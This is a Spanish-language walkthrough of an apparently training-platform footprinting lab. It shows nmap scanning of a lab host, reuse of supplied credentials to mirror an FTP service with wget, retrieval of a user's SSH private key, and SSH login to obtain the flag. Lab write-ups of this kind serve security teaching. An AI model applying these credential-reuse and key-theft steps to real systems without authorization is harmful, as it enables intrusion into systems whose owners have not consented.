
# Footprinting Lab - Easy

## <mark style="color:purple;">Introducción</mark>

***

La empresa `Inlanefreight Ltd` nos encargó probar tres servidores diferentes en su red interna. La empresa utiliza muchos servicios diferentes y el departamento de seguridad de TI consideró que era necesaria una prueba de penetración para obtener información sobre su postura general de seguridad.

El primer servidor es un servidor DNS interno que debe investigarse. En particular, nuestro cliente quiere saber qué información podemos obtener de estos servicios y cómo esta información podría usarse contra su infraestructura. Nuestro objetivo es recopilar la mayor cantidad de información posible sobre el servidor y encontrar formas de utilizar esa información en contra de la empresa. Sin embargo, nuestro cliente ha dejado claro que está prohibido atacar los servicios de forma agresiva utilizando exploits, ya que estos servicios están en producción.

Además, nuestros compañeros de equipo encontraron las siguientes credenciales "`ceil:qwer1234`" y señalaron que algunos de los empleados de la empresa estaban hablando sobre claves SSH en un foro.

Los administradores han almacenado un archivo `flag.txt` en este servidor para seguir nuestro progreso y medir el éxito. Enumere completamente el objetivo y envíe el contenido de este archivo como prueba.

***

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV 10.129.211.91                                                                      

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-09 14:07 CET
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 14:07
Scanning 10.129.211.91 [4 ports]
Completed Ping Scan at 14:07, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:07
Completed Parallel DNS resolution of 1 host. at 14:07, 0.02s elapsed
Initiating SYN Stealth Scan at 14:07
Scanning 10.129.211.91 [1000 ports]

Discovered open port 21/tcp on 10.129.211.91
Discovered open port 53/tcp on 10.129.211.91
Discovered open port 22/tcp on 10.129.211.91
Discovered open port 2121/tcp on 10.129.211.91

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp?
22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain       ISC BIND 9.16.1 (Ubuntu Linux)
2121/tcp open  ccproxy-ftp?

2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.94SVN%I=7%D=2/9%Time=65C623AE%P=aarch64-unknown-linux-gn
SF:u%r(GenericLines,9C,"220\x20ProFTPD\x20Server\x20\(ftp\.int\.inlanefrei
SF:ght\.htb\)\x20\[10\.129\.211\.91\]\r\n500\x20Invalid\x20command:\x20try
SF:\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20b
SF:eing\x20more\x20creative\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2121-TCP:V=7.94SVN%I=7%D=2/9%Time=65C623AE%P=aarch64-unknown-linux-
SF:gnu%r(GenericLines,8D,"220\x20ProFTPD\x20Server\x20\(Ceil's\x20FTP\)\x2
SF:0\[10\.129\.211\.91\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20
SF:more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\
SF:x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como tenemos la siguiente pista, nos centraremos en el servicio SSH por el puerto 22:

> Además, nuestros compañeros de equipo encontraron las siguientes credenciales "`ceil:qwer1234`" y señalaron que algunos de los empleados de la empresa estaban hablando sobre claves SSH en un foro.

```bash
ssh -o PasswordAuthentication=yes ceil@10.129.211.91

ceil@10.129.211.91: Permission denied (publickey).
```

No nos deja acceder por SSH a priori, asi que vamos a probar esas credenciales en otros servicios, como por ejemplo el `puerto 2121`, que actua como un proxy al servicio FTP.

Con el siguiente comando nos descargamos las claves `ID_RSA` para conectarnos por SSH:

```bash
wget -m --no-passive ftp://ceil:qwer1234@10.129.211.91:2121  
                    
--2024-02-09 14:38:39--  ftp://ceil:*password*@10.129.211.91:2121/
           => «10.129.211.91:2121/.listing»
Conectando con 10.129.211.91:2121... conectado.
Identificándose como ceil ... ¡Dentro!
==> SYST ... hecho.   ==> PWD ... hecho.
==> TYPE I ... hecho.  ==> no se necesita CWD.
==> PORT ... hecho.   ==> LIST ... hecho.

<------SNIP------>

10.129.211.91:2121/.ssh/id_rsa        100%[=======================================================================>]   3,30K  --.-KB/s    en 0,001s  

2024-02-09 14:38:51 (2,76 MB/s) - «10.129.211.91:2121/.ssh/id_rsa» guardado [3381]

--2024-02-09 14:38:51--  ftp://ceil:*password*@10.129.211.91:2121/.ssh/id_rsa.pub
           => «10.129.211.91:2121/.ssh/id_rsa.pub»
==> no se requiere CWD.
==> PORT ... hecho.   ==> RETR id_rsa.pub ... hecho.
Longitud: 738

10.129.211.91:2121/.ssh/id_rsa.pub    100%[=======================================================================>]     738  --.-KB/s    en 0s      

2024-02-09 14:38:52 (188 MB/s) - «10.129.211.91:2121/.ssh/id_rsa.pub» guardado [738]

ACABADO --2024-02-09 14:38:52--
Tiempo total de reloj: 12s
Descargados: 12 ficheros, 12K en 0,003s (4,32 MB/s)
```

{% hint style="info" %}
**Pista:** Recuerda que las claves SSH deben tener permisos específicos establecidos antes de poder usarse.
{% endhint %}

***

## <mark style="color:purple;">Entrando a SSH con ID\_RSA</mark>

<figure><img src="/files/R12VH0wD8LhMODYSWH9Q" alt=""><figcaption></figcaption></figure>

Al intentar acceder con el id\_rsa nos da el siguiente error:

<figure><img src="/files/18E3nWXHbHh0DwyvPcR0" alt=""><figcaption></figcaption></figure>

Nos dice que los permisos son demasiado abiertos, por lo que vamos a reducir los permisos con el comando `chmod 600`

<figure><img src="/files/k2fbDnKDV7DtQkT8uJlk" alt=""><figcaption></figcaption></figure>

Conseguimos acceder correctamente y nos hacemos con la flag 🏆

<figure><img src="/files/QPnnV0z8GRlcxgnuhWfq" alt=""><figcaption></figcaption></figure>
